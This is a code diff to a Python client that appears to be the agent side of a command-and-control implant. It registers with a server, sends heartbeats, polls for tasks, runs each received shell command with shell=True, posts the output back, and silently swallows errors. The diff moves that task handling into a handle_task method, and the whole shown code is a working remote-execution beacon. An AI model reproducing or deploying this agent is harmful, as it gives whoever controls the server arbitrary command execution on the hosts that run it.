@@ -26,6 +26,27 @@ class Client:
         req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=3)
         assert req.status_code == 201 or req.status_code == 200
 
+    def handle_task(self,task_json):
+        try:
+            task = task_json.get('action')
+            task_id = task_json.get('task_id')
+            #print(task)
+            if task == "command":
+                command = task_json.get('command')
+                ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
+                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
+                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
+            elif task == "download":
+                pass
+            elif task == "upload":
+                pass
+            else:
+                raise ValueError("Invalid task type")
+        except subprocess.CalledProcessError as e:
+                data = {'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
+                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
+        except Exception as e:
+            pass
 
     def run(self):
         heartbeat_thread = threading.Thread(target=self.heartbeat)
@@ -41,6 +62,7 @@ class Client:
                 req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=3)
                 if req.status_code == 418:
                     self.register()
+                    continue
                 if req.status_code not in [200, 201, 204]:
                     raise ValueError("Failed to get tasks")
                 elif req.status_code == 204:
@@ -48,29 +70,12 @@ class Client:
                     time.sleep(120)
                     continue
                 tasks = req.json()
-                #print(tasks)
+                self.handle_task(tasks)
                 if req.status_code not in [200, 201]:
                     raise ValueError("Failed to get tasks")
                 if req.text == "NULL":
                     time.sleep(120)
                     continue
-                task = tasks.get('action')
-                task_id = tasks.get('task_id')
-                #print(task)
-                if task == "command":
-                    command = tasks.get('command')
-                    ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
-                    data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
-                    req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
-                elif task == "download":
-                    pass
-                elif task == "upload":
-                    pass
-                else:
-                    raise ValueError("Invalid task type")
-            except subprocess.CalledProcessError as e:
-                data = {'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
-                req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
             except Exception as e:
                 pass
                 #print(e)
